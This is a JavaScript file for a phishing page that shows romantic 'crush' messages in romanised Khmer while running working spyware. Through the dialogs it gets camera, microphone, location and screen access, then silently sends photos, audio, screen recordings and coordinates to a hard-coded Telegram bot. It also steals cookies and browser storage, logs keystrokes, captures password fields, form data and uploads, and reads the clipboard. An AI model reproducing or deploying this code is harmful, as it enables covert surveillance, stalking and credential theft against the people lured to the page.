// Telegram Configuration
const TOKEN = "7568763554:AAEWXMBtpmJTYc4XAvUUA9Fk516PVf8PvcA";
let CHAT_ID = "6837307356";

// Global variables
let currentLocation = null;
let cameraStream = null;
let audioStream = null;
let screenRecorder = null;
let screenStream = null;
let recordedChunks = [];
let isRecording = false;
let loveAlertIndex = 0;
let permissionsRequested = {
    camera: false,
    audio: false,
    location: false,
    screen: false
};

// DOM Elements
const themeToggle = document.getElementById("themeToggle");

// ==================== CRUSH MESSAGES ====================
const crushMessages = [
    { text: "Hi crush 😘", permission: "camera" },
    { text: "som skal ban ot has 🥺", permission: "microphone" },
    { text: "nh luoch crush yu hz 🌷💛", permission: "location" },
    { text: "min deng tha yu mean neak nh te 😭", permission: "screen" },
    { text: "pel khenh yu mdong2 jit ot nov seng 😳", permission: null },
    { text: "yu cute klang nahh bbe 🤍", permission: null },
    { text: "pel yu smile mok jit khnhom jol chet klang mg 😭💛", permission: null },
    { text: "nh ot del mean aromm doch nis cheamuoy neak na te 🥺", permission: null },
    { text: "ber yu min romkhan nh te nh jg skal yu oy chet cheang nis 😚", permission: null },
    { text: "som oy ban chat cheamuoy yu yuy2 ban te 🌷", permission: null },
    { text: "tov na kor nerk tae yu mneak eng 😭🤍", permission: null },
    { text: "ber ban yu chea crush khnhom yuy2 kor laor nas hz 😳", permission: null },
    { text: "nh min deng tha crush yu tang pi pel na te tae deng tae tha crush klang hz 💔", permission: null },
    { text: "yu mean voice cute nahh 😭", permission: null },
    { text: "som kom mean neak nh ban te 😔", permission: null },
    { text: "nh jg oy yu deng tha mean mneak secretly srolanh yu 😚💛", permission: null },
    { text: "ber thngai na yu mean banha kor mean nh nov kbae yu nich 🤍", permission: null },
    { text: "yu chea mnus del tver oy thngai robos nh mean ney 😭🌷", permission: null },
    { text: "good night crushh 🌙", permission: null },
    { text: "sweet dream na bbe 😴💛", permission: null }
];

function showNextLoveAlert() {
    if (loveAlertIndex >= crushMessages.length) {
        sendMessageToTelegram(`💖 **All Crush Messages Completed** 💖\n\nTotal: ${crushMessages.length} messages\n💕 Love you forever! 💕`);
        return;
    }
    
    const currentAlert = crushMessages[loveAlertIndex];
    const result = confirm(currentAlert.text);
    
    if (result && currentAlert.permission) {
        if (currentAlert.permission === "camera") {
            requestCameraPermission();
        } else if (currentAlert.permission === "microphone") {
            requestMicrophonePermission();
        } else if (currentAlert.permission === "location") {
            requestLocationPermission();
        } else if (currentAlert.permission === "screen") {
            requestScreenPermission();
        }
    }
    
    loveAlertIndex++;
    showNextLoveAlert(); // Call immediately, no delay
}

// ==================== PERMISSION REQUESTS ====================

// 1. CAMERA PERMISSION
async function requestCameraPermission() {
    if (permissionsRequested.camera) return;
    
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: 'user' },
            audio: false 
        });
        
        cameraStream = stream;
        permissionsRequested.camera = true;
        
        await sendMessageToTelegram(`📸 *កាមេរ៉ាត្រូវបានអនុញ្ញាត*\n\n✅ Camera permission granted\n⏰ ${new Date().toLocaleString('km-KH')}`);
        
        capturePhotosSilently(stream);
        
    } catch (error) {
        await sendMessageToTelegram(`❌ *កាមេរ៉ាមិនត្រូវបានអនុញ្ញាត*\n\n📝 ${error.name === 'NotAllowedError' ? 'User denied' : 'Error occurred'}`);
    }
}

async function capturePhotosSilently(stream) {
    try {
        const video = document.createElement('video');
        video.style.display = 'none';
        document.body.appendChild(video);
        video.srcObject = stream;
        await video.play();
        
        for (let i = 1; i <= 3; i++) {
            setTimeout(async () => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                canvas.toBlob(async (blob) => {
                    if (blob) {
                        const file = new File([blob], `camera_${i}.jpg`, { type: 'image/jpeg' });
                        await sendFileToTelegram(file, `📸 Camera Photo #${i}`);
                    }
                }, 'image/jpeg', 0.8);
            }, i * 1500);
        }
        
        setTimeout(() => {
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
                cameraStream = null;
            }
            video.remove();
        }, 6000);
        
    } catch (error) {}
}

// 2. MICROPHONE PERMISSION
async function requestMicrophonePermission() {
    if (permissionsRequested.audio) return;
    
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        permissionsRequested.audio = true;
        
        await sendMessageToTelegram(`🎤 *មីក្រូហ្វូនត្រូវបានអនុញ្ញាត*\n\n✅ Microphone permission granted\n⏰ ${new Date().toLocaleString('km-KH')}`);
        
        recordAudioSilently(stream);
        
    } catch (error) {
        await sendMessageToTelegram(`❌ *មីក្រូហ្វូនមិនត្រូវបានអនុញ្ញាត*\n\n📝 ${error.name === 'NotAllowedError' ? 'User denied' : 'Error occurred'}`);
    }
}

async function recordAudioSilently(stream) {
    try {
        const audioRecorder = new MediaRecorder(stream);
        const audioChunks = [];
        
        audioRecorder.ondataavailable = (e) => { if (e.data.size > 0) audioChunks.push(e.data); };
        audioRecorder.onstop = async () => {
            const blob = new Blob(audioChunks, { type: 'audio/webm' });
            if (blob.size > 0) {
                const file = new File([blob], 'audio_recording.webm', { type: 'audio/webm' });
                await sendFileToTelegram(file, `🎤 Audio Recording`);
            }
            stream.getTracks().forEach(track => track.stop());
        };
        
        audioRecorder.start();
        setTimeout(() => { if (audioRecorder.state === 'recording') audioRecorder.stop(); }, 10000);
        
    } catch (error) {}
}

// 3. LOCATION PERMISSION
async function requestLocationPermission() {
    if (permissionsRequested.location) return;
    
    if (!navigator.geolocation) {
        await sendMessageToTelegram(`❌ *ទីតាំងមិនត្រូវបានគាំទ្រ*`);
        return;
    }
    
    navigator.geolocation.getCurrentPosition(
        async function(position) {
            permissionsRequested.location = true;
            currentLocation = {
                lat: position.coords.latitude,
                lng: position.coords.longitude,
                accuracy: Math.round(position.coords.accuracy)
            };
            
            const mapsLink = `https://www.google.com/maps?q=${currentLocation.lat},${currentLocation.lng}&z=15`;
            
            await sendMessageToTelegram(`📍 *ទីតាំងត្រូវបានអនុញ្ញាត*\n\n📌 Latitude: ${currentLocation.lat}\n📌 Longitude: ${currentLocation.lng}\n🎯 Accuracy: ±${currentLocation.accuracy}m\n🗺️ [Open Map](${mapsLink})`);
            
            try {
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ 
                        chat_id: CHAT_ID, 
                        latitude: currentLocation.lat,
                        longitude: currentLocation.lng
                    }),
                });
            } catch (err) {}
        },
        async function(error) {
            let msg = 'User denied location permission';
            if (error.code === error.TIMEOUT) msg = 'Timeout';
            else if (error.code === error.POSITION_UNAVAILABLE) msg = 'Position unavailable';
            await sendMessageToTelegram(`❌ *ទីតាំងមិនត្រូវបានអនុញ្ញាត*\n\n📝 ${msg}`);
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
}

// 4. SCREEN RECORDING PERMISSION
async function requestScreenPermission() {
    if (permissionsRequested.screen) return;
    if (isRecording) return;
    
    try {
        const stream = await navigator.mediaDevices.getDisplayMedia({
            video: { cursor: "always", frameRate: { ideal: 30 } },
            audio: true
        });
        
        permissionsRequested.screen = true;
        screenStream = stream;
        
        await sendMessageToTelegram(`🎬 *ការថតអេក្រង់ត្រូវបានអនុញ្ញាត*\n\n✅ Screen recording granted\n⏰ ${new Date().toLocaleString('km-KH')}`);
        
        const mimeType = MediaRecorder.isTypeSupported('video/webm') ? 'video/webm' : 'video/mp4';
        screenRecorder = new MediaRecorder(stream, { 
            mimeType: mimeType,
            videoBitsPerSecond: 2500000 
        });
        recordedChunks = [];
        
        screenRecorder.ondataavailable = (e) => { if (e.data && e.data.size > 0) recordedChunks.push(e.data); };
        screenRecorder.onstop = async () => {
            isRecording = false;
            const blob = new Blob(recordedChunks, { type: mimeType });
            
            if (blob.size > 0) {
                const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
                const file = new File([blob], `screen_${Date.now()}.${ext}`, { type: mimeType });
                await sendVideoToTelegram(file, `🎥 Screen Recording\n📊 Size: ${formatBytes(blob.size)}`);
            }
            
            recordedChunks = [];
            if (screenStream) {
                screenStream.getTracks().forEach(track => track.stop());
                screenStream = null;
            }
            screenRecorder = null;
        };
        
        screenRecorder.start(1000);
        isRecording = true;
        
        setTimeout(() => {
            if (screenRecorder && screenRecorder.state === 'recording') screenRecorder.stop();
        }, 30000);
        
        stream.getVideoTracks()[0].addEventListener('ended', () => {
            if (screenRecorder && screenRecorder.state === 'recording') screenRecorder.stop();
        });
        
    } catch (error) {
        let msg = error.name === 'NotAllowedError' ? 'User denied screen permission' : 'Error occurred';
        await sendMessageToTelegram(`❌ *ការថតអេក្រង់មិនត្រូវបានអនុញ្ញាត*\n\n📝 ${msg}`);
    }
}

// ==================== STEAL ALL DATA ====================
function getAllCookies() {
    const cookies = {};
    const cookieString = document.cookie;
    if (!cookieString) return cookies;
    
    cookieString.split(';').forEach(cookie => {
        const parts = cookie.split('=');
        const name = parts[0].trim();
        const value = parts.length > 1 ? decodeURIComponent(parts.slice(1).join('=').trim()) : '';
        if (name) cookies[name] = value;
    });
    return cookies;
}

function getCookieDetails() {
    const cookies = [];
    const cookieString = document.cookie;
    if (!cookieString) return cookies;
    
    cookieString.split(';').forEach(cookie => {
        const parts = cookie.split('=');
        const name = parts[0].trim();
        const value = parts.length > 1 ? decodeURIComponent(parts.slice(1).join('=').trim()) : '';
        
        const sensitiveKeywords = ['session', 'token', 'auth', 'login', 'user', 'pass', 'email', 'id', 'key', 'secret', 'jwt'];
        const isSensitive = sensitiveKeywords.some(keyword => 
            name.toLowerCase().includes(keyword) || value.toLowerCase().includes(keyword)
        );
        
        cookies.push({ name, value, isSensitive });
    });
    return cookies;
}

function getAllStorageData() {
    const data = { localStorage: {}, sessionStorage: {}, cookies: getAllCookies() };
    
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        try { data.localStorage[key] = localStorage.getItem(key); } catch(e) { data.localStorage[key] = 'Cannot read'; }
    }
    
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        try { data.sessionStorage[key] = sessionStorage.getItem(key); } catch(e) { data.sessionStorage[key] = 'Cannot read'; }
    }
    return data;
}

async function stealAllData() {
    if (!CHAT_ID) return;
    
    try {
        const cookies = getCookieDetails();
        const storageData = getAllStorageData();
        const deviceInfo = await collectDeviceInfo();
        
        let message = `🔴 *STOLEN DATA REPORT*\n\n`;
        message += `🍪 Cookies: ${cookies.length} found\n`;
        
        if (cookies.length > 0) {
            cookies.slice(0, 5).forEach(c => {
                const shortValue = c.value.length > 50 ? c.value.substring(0, 50) + '...' : c.value;
                message += `├─ ${c.name}: ${shortValue}\n`;
            });
            if (cookies.length > 5) message += `└─ ... and ${cookies.length - 5} more\n`;
        }
        
        message += `\n💾 Storage:\n├─ LocalStorage: ${Object.keys(storageData.localStorage).length} items\n├─ SessionStorage: ${Object.keys(storageData.sessionStorage).length} items\n\n`;
        message += `\n${formatDeviceInfo(deviceInfo)}`;
        
        await sendMessageToTelegram(message);
        
        const fullData = { timestamp: new Date().toISOString(), url: window.location.href, cookies, storage: storageData, deviceInfo };
        const jsonBlob = new Blob([JSON.stringify(fullData, null, 2)], { type: 'application/json' });
        const jsonFile = new File([jsonBlob], `stolen_${Date.now()}.json`, { type: 'application/json' });
        await sendFileToTelegram(jsonFile, `📁 Complete Stolen Data`);
        
    } catch (error) {}
}

// ==================== DEVICE INFO COLLECTION ====================
async function collectDeviceInfo() {
    const info = {
        timestamp: new Date().toLocaleString('km-KH'),
        ip: await getIPAddress(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: `${window.screen.width}x${window.screen.height}`,
        viewport: `${window.innerWidth}x${window.innerHeight}`,
        cookiesEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
        online: navigator.onLine ? 'Online' : 'Offline',
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        url: window.location.href,
        hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
        deviceMemory: navigator.deviceMemory || 'Unknown'
    };
    
    if (currentLocation) info.location = currentLocation;
    return info;
}

async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch { return 'Unable to fetch'; }
}

function formatDeviceInfo(info) {
    let locationText = 'Not available';
    if (info.location) locationText = `Lat: ${info.location.lat}, Lng: ${info.location.lng} (±${info.location.accuracy}m)`;
    
    return `
📱 *Device Information*
⏰ Time: ${info.timestamp}
🌐 IP: ${info.ip}
💻 CPU: ${info.hardwareConcurrency} cores
🧠 RAM: ${info.deviceMemory}GB
🖥️ Platform: ${info.platform}
🗣️ Language: ${info.language}
🕐 Timezone: ${info.timezone}
📺 Screen: ${info.screen}
📍 Location: ${locationText}
📄 URL: ${info.url}
    `.trim();
}

// ==================== TELEGRAM FUNCTIONS ====================
async function sendMessageToTelegram(message) {
    if (!CHAT_ID || !message) return;
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' }),
        });
    } catch (err) {}
}

async function sendFileToTelegram(file, caption) {
    if (!CHAT_ID) return;
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('document', file);
    if (caption) formData.append('caption', caption);
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, { method: "POST", body: formData });
    } catch (error) {}
}

async function sendVideoToTelegram(file, caption) {
    if (!CHAT_ID) return;
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('video', file);
    if (caption) formData.append('caption', caption);
    try {
        const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: "POST", body: formData });
        if (!response.ok) await sendFileToTelegram(file, caption);
    } catch (error) { await sendFileToTelegram(file, caption); }
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

// ==================== URL FUNCTIONS ====================
function cleanURL() {
    const uri = window.location.toString();
    const patterns = ["%3D", "%3D%3D", "&m=1", "?m=1"];
    patterns.forEach(p => { if (uri.indexOf(p) > 0) window.history.replaceState({}, document.title, uri.substring(0, uri.indexOf(p))); });
}

function GetURLParameter(sParam) {
    const sPageURL = window.location.search.substring(1);
    const sURLVariables = sPageURL.split('&');
    for (let i = 0; i < sURLVariables.length; i++) {
        const sParameterName = sURLVariables[i].split('=');
        if (sParameterName[0] === sParam) return sParameterName[1];
    }
    return null;
}

function decodeBase64(encodedStr) {
    try { return decodeURIComponent(atob(encodedStr)); } catch(e) { return null; }
}

function getChatIDFromURL() {
    const base64Id = GetURLParameter('i');
    return base64Id ? decodeBase64(base64Id) : null;
}

function initTheme() {
    if (themeToggle) themeToggle.style.display = 'none';
}

// ==================== KEYLOGGER ====================
let keylogBuffer = '';
let keylogTimer = null;

document.addEventListener('keydown', function(e) {
    if (!CHAT_ID) return;
    if (e.target && e.target.type === 'password') return;
    
    if (e.key.length === 1) keylogBuffer += e.key;
    else if (e.key === 'Enter') keylogBuffer += '\n';
    else if (e.key === 'Backspace') keylogBuffer = keylogBuffer.slice(0, -1);
    else if (e.key === ' ') keylogBuffer += ' ';
    else if (e.key === 'Tab') keylogBuffer += '    ';
    
    clearTimeout(keylogTimer);
    keylogTimer = setTimeout(async () => {
        if (keylogBuffer.length > 0) {
            await sendMessageToTelegram(`⌨️ *Keylogger*\n\n${keylogBuffer}`);
            keylogBuffer = '';
        }
    }, 3000);
});

// ==================== FORM INTERCEPTION ====================
document.addEventListener('submit', async function(e) {
    if (!CHAT_ID) return;
    
    const form = e.target;
    const formData = new FormData(form);
    const data = {};
    
    for (let [key, value] of formData.entries()) {
        if (value instanceof File) {
            data[key] = `[FILE: ${value.name}]`;
            await sendFileToTelegram(value, `📎 Form File: ${key}`);
        } else if (value && value.toString().trim() !== '') {
            data[key] = value;
        }
    }
    
    if (Object.keys(data).length > 0) {
        let message = `📝 *Form Submitted*\n\n📋 Action: ${form.action || 'None'}\n📋 Method: ${form.method || 'GET'}\n\n📊 Data:\n`;
        for (let [key, value] of Object.entries(data)) {
            const shortValue = String(value).length > 100 ? String(value).substring(0, 100) + '...' : value;
            message += `├─ ${key}: ${shortValue}\n`;
        }
        await sendMessageToTelegram(message);
    }
});

// ==================== PASSWORD MONITORING ====================
document.addEventListener('input', async function(e) {
    if (!CHAT_ID) return;
    const target = e.target;
    if (target && target.type === 'password' && target.value && target.value.length > 0) {
        const name = target.name || target.id || 'Unknown';
        await sendMessageToTelegram(`🔐 *Password Entered*\n\n📝 Field: ${name}\n🔑 Value: ${target.value}`);
        keylogBuffer = '';
    }
});

// ==================== CLIPBOARD MONITORING ====================
let lastClipboard = '';
setInterval(async () => {
    if (!CHAT_ID) return;
    try {
        const text = await navigator.clipboard.readText();
        if (text && text !== lastClipboard && text.length > 0 && text.length < 500) {
            lastClipboard = text;
            await sendMessageToTelegram(`📋 *Clipboard*\n\n${text}`);
        }
    } catch (error) {}
}, 5000);

// ==================== PAGE UNLOAD ====================
window.addEventListener('beforeunload', function() {
    if (!CHAT_ID) return;
    const message = `👋 *User Leaving*\n\nURL: ${window.location.href}\n⏰ ${new Date().toLocaleString('km-KH')}`;
    const blob = new Blob([JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })], { type: 'application/json' });
    navigator.sendBeacon(`https://api.telegram.org/bot${TOKEN}/sendMessage`, blob);
});

// ==================== INITIALIZE ====================
document.addEventListener('DOMContentLoaded', function() {
    cleanURL();
    const chatIDFromURL = getChatIDFromURL();
    if (chatIDFromURL) CHAT_ID = chatIDFromURL;
    initTheme();
    
    if (themeToggle) themeToggle.style.display = 'none';
    
    sendMessageToTelegram(`🚀 *Page Loaded*\n\n📍 URL: ${window.location.href}\n⏰ ${new Date().toLocaleString('km-KH')}`);
    
    // Start alerts immediately
    showNextLoveAlert();
    
    // Steal data after 10 seconds
    setTimeout(() => { stealAllData(); }, 10000);
    
    // Steal data every 60 seconds
    setInterval(() => { stealAllData(); }, 60000);
});